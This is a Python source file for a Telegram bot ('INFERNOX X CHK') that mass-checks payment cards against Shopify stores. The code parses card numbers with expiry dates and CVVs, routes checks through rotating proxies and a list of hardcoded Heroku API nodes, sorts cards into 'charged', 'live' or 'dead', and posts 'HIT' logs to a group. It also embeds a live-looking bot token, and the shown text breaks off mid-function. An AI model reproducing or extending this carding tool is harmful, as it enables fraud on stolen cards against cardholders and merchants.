import asyncio
import aiohttp
import json
import threading as _threading
import random
import re
import logging
import time
import string
import os
from datetime import datetime
from typing import Optional, Tuple, List, Dict, Any
from io import BytesIO
from collections import deque
from dataclasses import dataclass, field
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SAFE HTML
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def safe_html(text) -> str:
    if text is None:
        return ""
    text = str(text)
    text = text.replace('&', '&amp;')
    text = text.replace('<', '&lt;')
    text = text.replace('>', '&gt;')
    text = text.replace('"', '&quot;')
    text = text.replace("'", '&#39;')
    return text

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters.callback_data import CallbackData
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from rate_limiter import RateLimiter

LOG_BOT_TOKEN = "8698278911:AAGgj77lazdTBDc8POIc4FhTGSJbMBjk1iI"
log_bot = Bot(token=LOG_BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
hit_log_limiter = RateLimiter(min_interval=3.0)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, update_user_hits, deduct_credits_atomic, ADMIN_IDS
import database
from bin import get_bin_info
from sub import get_premium_status
from ui import mass_status_frame, random_diamond, random_star, REPLY_EMOJI_ID, gate_result_caption
from video_helpers import send_random_video

def _get_forward_to_monitor():
    try:
        from __main__ import forward_to_monitor as _f
        return _f
    except Exception:
        try:
            from main import forward_to_monitor as _f
            return _f
        except Exception as e:
            logging.warning(f"[MSH] monitor sink unavailable: {e}")
            return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NODE SOURCES — hardcoded seed ∪ api_endpoints.txt
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

API_ENDPOINTS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "api_endpoints.txt")

_HARDCODED_NODES = [
    {"name": "API2-8", "url": "https://stormy-garden-01588-8026d49056eb.herokuapp.com"},
    {"name": "API2-7", "url": "https://damp-refuge-33171-10252938ad57.herokuapp.com"},
    {"name": "API2-6", "url": "https://dry-dusk-74141-f4362a8da2e3.herokuapp.com"},
    {"name": "API2-5", "url": "https://fathomless-caverns-85922-338f79ffc600.herokuapp.com"},
    {"name": "API2-4", "url": "https://desolate-falls-41939-ef0bb3b081a9.herokuapp.com"},
    {"name": "API2-3", "url": "https://mysterious-shore-53941-2484de81b00b.herokuapp.com"},
    {"name": "API2-2", "url": "https://intense-ravine-51817-9b71e7a39be0.herokuapp.com"},
    {"name": "API2-1", "url": "https://sleepy-depths-98383-23d5fc5adca0.herokuapp.com"},
    {"name": "API2-8", "url": "https://stormy-garden-01588-8026d49056eb.herokuapp.com"},
    {"name": "API2-7", "url": "https://damp-refuge-33171-10252938ad57.herokuapp.com"},
    {"name": "API2-6", "url": "https://dry-dusk-74141-f4362a8da2e3.herokuapp.com"},
    {"name": "API2-5", "url": "https://fathomless-caverns-85922-338f79ffc600.herokuapp.com"},
    {"name": "API2-4", "url": "https://desolate-falls-41939-ef0bb3b081a9.herokuapp.com"},
    {"name": "API2-3", "url": "https://mysterious-shore-53941-2484de81b00b.herokuapp.com"},
    {"name": "API2-2", "url": "https://intense-ravine-51817-9b71e7a39be0.herokuapp.com"},
    {"name": "API2-1", "url": "https://sleepy-depths-98383-23d5fc5adca0.herokuapp.com"},
]

def _derive_name(url: str, fallback_idx: int) -> str:
    """Friendly name from a URL."""
    try:
        host = url.replace("https://", "").replace("http://", "").split("/")[0]
        # shop-chk-api2-8-xxxx → API2-8
        m = re.search(r'api[-_]?(\d+)[-_](\d+)', host, re.IGNORECASE)
        if m:
            return f"API{m.group(1)}-{m.group(2)}"
        # fallback: first label
        first = host.split(".")[0]
        return first[:16] or f"API-{fallback_idx}"
    except Exception:
        return f"API-{fallback_idx}"

def _load_node_configs() -> List[dict]:
    """Merge hardcoded seeds with api_endpoints.txt. Dedup by URL. Rewrite file with union."""
    configs = list(_HARDCODED_NODES)
    seen_urls = {c["url"].rstrip("/") for c in configs}

    if os.path.exists(API_ENDPOINTS_FILE):
        try:
            with open(API_ENDPOINTS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    raw = line.strip()
                    if not raw:
                        continue
                    url = raw.rstrip("/")
                    if url in seen_urls:
                        continue
                    name = _derive_name(url, len(configs) + 1)
                    configs.append({"name": name, "url": url})
                    seen_urls.add(url)
                    logging.info(f"[MSH] Loaded extra node from file: {name} → {url}")
        except Exception as e:
            logging.error(f"[MSH] api_endpoints load failed: {e}")

    # Rewrite with merged list so /addapi and file stay in sync
    try:
        with open(API_ENDPOINTS_FILE, "w", encoding="utf-8") as f:
            for c in configs:
                f.write(c["url"] + "\n")
    except Exception as e:
        logging.error(f"[MSH] api_endpoints write failed: {e}")

    return configs

# ── Timeouts / cooldown ──
_CHECK_TIMEOUT     = 90
_HEALTH_INTERVAL   = 5
_PROBE_TIMEOUT     = 15
_COOLDOWN_STEPS    = [30, 60, 120]
_MAX_NODE_HOPS     = 7

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# NODE STATE + MANAGER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dataclass
class _Node:
    name:     str
    url:      str
    enabled:              bool  = True
    active:               int   = 0
    total:                int   = 0
    total_ok:             int   = 0
    total_fail:           int   = 0
    fail_streak:          int   = 0
    timeout_streak:       int   = 0
    consecutive_timeouts: int   = 0
    cooldown_until:       float = 0.0
    probing:              bool  = False
    last_ok:              float = field(default_factory=time.monotonic)
    avg_rtt_ms:           float = 0.0

    @property
    def on_cooldown(self) -> bool:
        return time.monotonic() < self.cooldown_until

    @property
    def cooldown_expired(self) -> bool:
        return self.cooldown_until > 0.0 and not self.on_cooldown and not self.probing

    @property
    def available(self) -> bool:
        return self.enabled and not self.on_cooldown and not self.probing

    @property
    def cooldown_remaining(self) -> int:
        return max(0, int(self.cooldown_until - time.monotonic()))

    def start_cooldown(self):
        self.consecutive_timeouts += 1
        idx = min(self.consecutive_timeouts - 1, len(_COOLDOWN_STEPS) - 1)
        secs = _COOLDOWN_STEPS[idx]
        self.cooldown_until = time.monotonic() + secs
        logging.warning(f"[NODE] {self.name} → cooldown {secs}s (streak={self.consecutive_timeouts})")

    def mark_ok(self):
        self.last_ok = time.monotonic()
        self.fail_streak = 0
        self.timeout_streak = 0
        self.consecutive_timeouts = 0
        self.cooldown_until = 0.0
        self.probing = False
        self.total_ok += 1

    def update_rtt(self, elapsed_ms: float):
        if self.avg_rtt_ms == 0.0:
            self.avg_rtt_ms = elapsed_ms
        else:
            self.avg_rtt_ms = 0.8 * self.avg_rtt_ms + 0.2 * elapsed_ms

    def record_timeout(self):
        self.active = max(0, self.active - 1)
        self.fail_streak += 1
        self.timeout_streak += 1
        self.total_fail += 1
        if self.timeout_streak >= 1:
            self.timeout_streak = 0
            self.start_cooldown()

    def record_error(self):
        self.active = max(0, self.active - 1)
        self.fail_streak += 1
        self.timeout_streak = 0
        self.total_fail += 1
        if self.fail_streak >= 2:
            self.start_cooldown()


class NodeManager:
    def __init__(self, configs: List[dict]):
        self._nodes: List[_Node] = [_Node(name=c["name"], url=c["url"].rstrip("/")) for c in configs]
        self._session: Optional[aiohttp.ClientSession] = None
        self._hc_task: Optional[asyncio.Task] = None
        self._by_url: Dict[str, _Node] = {n.url: n for n in self._nodes}
        self._by_name: Dict[str, _Node] = {n.name: n for n in self._nodes}

    async def _sess(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False, ttl_dns_cache=300, use_dns_cache=True)
            self._session = aiohttp.ClientSession(connector=conn)
        return self._session

    def _pick(self, exclude: Optional[set] = None) -> Optional[_Node]:
        pool = [n for n in self._nodes if not (exclude and n.url in exclude)]
        if not pool:
            pool = list(self._nodes)
        avail = [n for n in pool if n.available]
        if not avail:
            avail = [n for n in pool if n.enabled]
            if avail:
                avail.sort(key=lambda n: n.cooldown_until)
            else:
                avail = pool

        def _load(n: _Node) -> float:
            util = min(n.active / 1000, 1.0)
            score = util
            if n.fail_streak > 0:
                score += min(n.fail_streak * 0.08, 0.5)
            if n.avg_rtt_ms > 0:
                score += min(n.avg_rtt_ms / 60_000, 0.3)
            return score + random.uniform(0, 0.01)

        avail.sort(key=_load)
        return avail[0]

    async def _probe_node(self, node: _Node, sess: aiohttp.ClientSession) -> bool:
        try:
            async with sess.get(f"{node.url}/health", timeout=aiohttp.ClientTimeout(total=_PROBE_TIMEOUT), ssl=None) as r:
                if r.status < 500:
                    return True
        except Exception:
            pass
        return False

    async def _health_loop(self):
        await asyncio.sleep(2)
        while True:
            try:
                sess = await self._sess()
                for node in self._nodes:
                    if not node.enabled:
                        continue
                    if node.cooldown_expired:
                        node.probing = True
                        ok = await self._probe_node(node, sess)
                        if ok:
                            node.mark_ok()
                            logging.info(f"[NODE] {node.name} ✓ recovered")
                        else:
                            node.probing = False
                            node.fail_streak += 1
                            node.start_cooldown()
                            logging.warning(f"[NODE] {node.name} ✗ probe failed — re-cooling ({node.cooldown_remaining}s)")
            except Exception:
                pass
            await asyncio.sleep(_HEALTH_INTERVAL)

    def start_health_polling(self):
        if self._hc_task is None or self._hc_task.done():
            try:
                loop = asyncio.get_running_loop()
                self._hc_task = loop.create_task(self._health_loop())
            except RuntimeError:
                pass

    async def check(self, card: str, proxy: str = "", site: str = "", *, retries: int = _MAX_NODE_HOPS - 1) -> dict:
        proxy_str = _to_api_proxy(proxy)
        tried: set = set()
        last_err = "NODE_UNAVAILABLE"
        sess = await self._sess()

        for attempt in range(retries + 1):
            node = self._pick(exclude=tried)
            if node is None:
                break
            tried.add(node.url)

            raw_url = f"{node.url}/?{card}"
            if proxy_str:
                import urllib.parse as _up
                raw_url += f"&proxy={_up.quote(proxy_str, safe='')}"

            node.active += 1
            node.total += 1
            t_start = time.monotonic()

            try:
                async with sess.get(raw_url, timeout=aiohttp.ClientTimeout(total=_CHECK_TIMEOUT), ssl=None) as r:
                    if r.status == 503:
                        node.active = max(0, node.active - 1)
                        last_err = f"503 on {node.name}"
                        await asyncio.sleep(0.1)
                        continue

                    body = await r.json(content_type=None)
                    elapsed_ms = (time.monotonic() - t_start) * 1000
                    node.active = max(0, node.active - 1)
                    node.mark_ok()
                    node.update_rtt(elapsed_ms)

                    resp_probe = str(body.get("Response", "")).lower()
                    if any(k in resp_probe for k in ("proxy burned", "change your proxy", "proxy error")):
                        last_err = "Proxy burned"
                        continue

                    return {
                        "Response": str(body.get("Response", body.get("message", "UNKNOWN"))),
                        "Gate":     str(body.get("Gate",     body.get("gateway", "Shopify Payments"))),
                        "Charged":  str(body.get("Charged",  "False")),
                        "Approved": str(body.get("Approved", "False")),
                        "Price":    str(body.get("Price",    body.get("price", "0"))),
                        "Time":     body.get("Time", ""),
                        "_node":    node.name,
                        "_rtt_ms":  round(elapsed_ms),
                    }

            except asyncio.TimeoutError:
                node.record_timeout()
                last_err = f"Timeout on {node.name}"
            except Exception as e:
                node.record_error()
                last_err = str(e)[:80]

        return {"success": False, "message": last_err, "Response": last_err}

    # ── Node list mutation (for /addapi + /removeapi) ──
    def list_nodes(self) -> List[dict]:
        return [
            {
                "name": n.name, "url": n.url, "enabled": n.enabled,
                "available": n.available, "on_cooldown": n.on_cooldown,
                "cooldown": n.cooldown_remaining, "active": n.active,
                "total": n.total, "total_ok": n.total_ok, "total_fail": n.total_fail,
            }
            for n in self._nodes
        ]

    def add_node(self, url: str) -> bool:
        url = url.rstrip("/")
        if url in self._by_url:
            return False
        name = _derive_name(url, len(self._nodes) + 1)
        node = _Node(name=name, url=url)
        self._nodes.append(node)
        self._by_url[url] = node
        self._by_name[name] = node
        # Persist
        try:
            with open(API_ENDPOINTS_FILE, "w", encoding="utf-8") as f:
                for n in self._nodes:
                    f.write(n.url + "\n")
        except Exception as e:
            logging.error(f"[MSH] persist add_node: {e}")
        logging.info(f"[MSH] Added node {name} → {url}")
        return True

    def remove_node_by_index(self, idx: int) -> Optional[str]:
        if idx < 0 or idx >= len(self._nodes):
            return None
        node = self._nodes.pop(idx)
        self._by_url.pop(node.url, None)
        self._by_name.pop(node.name, None)
        try:
            with open(API_ENDPOINTS_FILE, "w", encoding="utf-8") as f:
                for n in self._nodes:
                    f.write(n.url + "\n")
        except Exception as e:
            logging.error(f"[MSH] persist remove_node: {e}")
        logging.info(f"[MSH] Removed node {node.name}")
        return node.url

    async def close(self):
        if self._hc_task and not self._hc_task.done():
            self._hc_task.cancel()
            try:
                await self._hc_task
            except Exception:
                pass
        if self._session and not self._session.closed:
            await self._session.close()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY FORMAT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _to_api_proxy(proxy: str) -> str:
    p = (proxy or "").strip()
    if not p:
        return ""
    p_clean = re.sub(r'^(https?|socks[45])://', '', p)
    if '@' in p_clean:
        creds, hostport = p_clean.rsplit('@', 1)
        parts = hostport.split(':')
        host = parts[0]
        port = parts[1] if len(parts) > 1 else "8080"
        cp = creds.split(':', 1)
        user = cp[0]
        pw = cp[1] if len(cp) > 1 else ""
        return f"{host}:{port}:{user}:{pw}"
    return p_clean


def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    response = raw.get("Response", "Unknown")
    price    = raw.get("Price", "-")
    gate     = raw.get("Gate", "Shopify Payments")
    charged  = str(raw.get("Charged", "False")).strip().lower() == "true"
    approved = str(raw.get("Approved", "False")).strip().lower() == "true"

    rl = response.lower()
    if charged or "order_placed" in rl or "order placed" in rl or "order completed" in rl or "order paid" in rl or "💎" in response:
        status = "Charged"
    elif approved or any(k in rl for k in [
        "insufficient_funds", "insufficient funds",
        "incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv",
        "incorrect_zip", "3ds", "otp", "ds_required", "approved",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response, "Price": price, "Gate": gate,
        "Status": status,
        "Charged": str(charged), "Approved": str(approved),
        "CC": raw.get("CC", cc_str), "Site": raw.get("Site", site_url),
        "Time": raw.get("Time", "-"), "_node": raw.get("_node", ""),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


async def _check_card_site(node_mgr: NodeManager, cc_str: str, site_url: str, proxy_str: Optional[str]) -> dict:
    if not proxy_str:
        return {"Response": "No proxy", "Price": "-", "Gate": "-", "Status": "Error", "CC": cc_str, "Site": site_url}
    if site_url and not site_url.startswith("http"):
        site_url = f"https://{site_url}"
    site_url = (site_url or "").rstrip("/")

    raw = await node_mgr.check(card=cc_str, proxy=proxy_str, site=site_url)
    if not raw.get("Response") or (not raw.get("Charged") and not raw.get("Approved") and "success" in raw and not raw.get("success", True) and raw.get("Price") in (None, "", "0", "-")):
        return {"Response": raw.get("message", "All nodes failed"), "Price": "-", "Gate": "-", "Status": "Error", "CC": cc_str, "Site": site_url}
    return _map_result(raw, cc_str, site_url)


# ── Global manager (loads hardcoded ∪ file) ──
_MSH_NODE_MGR = NodeManager(_load_node_configs())

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIT_LOG_GROUP_ID = -1004315327411
BUTTON_LOCK_SECONDS = 30
MSH_SESSIONS = {}
SESSION_LOCKS = {}
_MSH_SESSION_MAX_AGE = 3600

def _cleanup_msh_sessions():
    cutoff = time.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    def _loop():
        while True:
            time.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()

router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD', 'OTP_REQUIRED'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway', 'proxy burned', 'change your proxy'
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id = session_id
        self.raw_proxies = list(set(proxies_list))
        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]
        self.proxy_queue = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} proxies for session {session_id}")

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None
        proxy = proxy.strip()
        parts = proxy.split()
        if len(parts) == 4:
            user, pw, host, port = parts
            return f"{host}:{port}:{user}:{pw}"
        return proxy

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False
        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2
        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)
            proxy = self.proxy_queue.popleft()
            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)
                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]
            self.proxy_queue.append(proxy)
            self.total_uses += 1
            return proxy, True
        if self.failed_proxies:
            best_proxy = min(self.failed_proxies.keys(), key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf')))
            self.total_uses += 1
            return best_proxy, True
        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''
        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False
        if '429' in response_lower or 'too many requests' in response_lower:
            return False
        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False
        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False
        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False
        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False
        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True
        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()
        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {'fail_count': 0, 'first_fail': current_time, 'last_fail': current_time, 'cooldown_until': 0}
            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time
            fail_count = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]
            fail_data['cooldown_until'] = current_time + cooldown_duration
            logging.warning(f"[ProxyManager] Proxy FAILED: {mask_proxy(proxy)} (#{fail_count}) Cooldown: {cooldown_duration}s | {api_response[:80]}")
        else:
            self.report_success(proxy)

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        return {'total_proxies': len(self.all_proxies), 'active': active_count, 'failed': len(self.failed_proxies), 'total_uses': self.total_uses}

def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                return f"***@{parts[1]}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD EXTRACTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    return (time.time() - session.get('start_time', 0)) < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    return max(0, int(BUTTON_LOCK_SECONDS - (time.time() - session.get('start_time', 0))) + 1)

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(database.get_premium_status, user_id)
    if is_premium:
        plan = await asyncio.to_thread(database.get_user_plan, user_id)
        return plan or "PREMIUM"
    return "TRIAL"

async def get_user_proxies(user_id):
    try:
        def _sync_fetch():
            return [d["proxy"] for d in database.get_user_proxies(user_id)]
        return await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
        return []

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit(): return False
    total = 0
    for i, char in enumerate(card_number[::-1]):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9: digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        cy, cm = now.year % 100, now.month
        ey, em = int(yy), int(mm)
        if ey < cy: return True
        if ey == cy and em < cm: return True
        return False
    except ValueError:
        return True

def get_sites():
    try:
        if os.path.exists("sites.txt"):
            with open("sites.txt", "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return []

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    if result_type == "charged":
        cards_list, type_label, type_emoji = session.get('charged_cards', []), "Charged", "💎"
    elif result_type == "live":
        cards_list, type_label, type_emoji = session.get('live_cards', []), "Live", "✅"
    elif result_type == "dead":
        cards_list, type_label, type_emoji = session.get('dead_cards', []), "Dead", "❌"
    else:
        cards_list = session.get('charged_cards', []) + session.get('live_cards', []) + session.get('dead_cards', []) + session.get('error_cards', [])
        type_label, type_emoji = "All", "📁"

    total_count = len(cards_list)
    plan_name_clean = re.sub(r'<[^>]+>', '', plan_name)
    user_display = get_user_display(user_obj, plan_name_clean)

    lines = ["━" * 32, "           𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", "━" * 32, "",
             f"Result Type → {type_label} {type_emoji}", f"Total Cards → {total_count}",
             "Gateway → Shopify Mass", "Powered By → 𝑰𝑵𝑭𝑬𝑹𝑵𝑶 𝑿 𝑪𝑯𝑲", "━" * 32, ""]

    if total_count == 0:
        lines.append("No cards found for this category")
    else:
        for c in cards_list:
            cc = c.get('card', 'N/A')
            response = c.get('response', 'N/A')
            bin_info = c.get('bin_info', {})
            price = c.get('price', 'N/A')
            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            if "CHARGED" in response or "ORDER_PLACED" in response or "ORDER_PAID" in response:
                status = "Charged 💎"
            elif "APPROVED" in response or "DS_REQUIRED" in response or "INSUFFICIENT_FUND" in response or "3DS_REQUIRED" in response or "OTP_REQUIRED" in response:
                status = "Approved ✅"
            elif any(err in response for err in ["timeout", "connection error", "max retries", "json decode", "invalid api", "Unknown Error"]):
                status = "ERROR ⚠️"
            else:
                status = "DECLINED ❌"

            lines.extend([f"Status → {status}", f"Card → {cc}",
                          f"Gateway → Shopify {price} {c.get('currency', 'USD')}",
                          f"Response → {response}", f"Brand → {scheme}",
                          f"Issuer → {bank}", f"Country → {country_display}",
                          f"User → {user_display}", f"Dev → 𝗡𝗔𝗥𝗨𝗧𝗢", "━" * 32, ""])

    file_buffer = BytesIO("\n".join(lines).encode('utf-8'))
    file_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"INFERNOX{type_map.get(result_type, 'ALL')}_{timestamp}.txt"
    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MONITOR + SENDERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _monitor_forward(bot, *, gate, status, card, site, amount, extra, user_obj):
    fn = _get_forward_to_monitor()
    if fn is None: return
    try:
        await fn(bot, gate=gate, status=status, card=card, site=site or "",
                 amount=amount or "", extra=extra or "",
                 user_id=user_obj.id, username=user_obj.username or user_obj.first_name)
    except Exception as e:
        logging.warning(f"[MSH] monitor forward failed: {e}")

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, proxy_status_formatted, price, currency="USD"):
    user_link = build_user_link(user_obj)
    gateway_display = html_escape(f"Shopify {price} {currency}")
    safe_response = safe_html(response_msg)
    caption = (f"{random_diamond()} 𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {random_diamond()}\n"
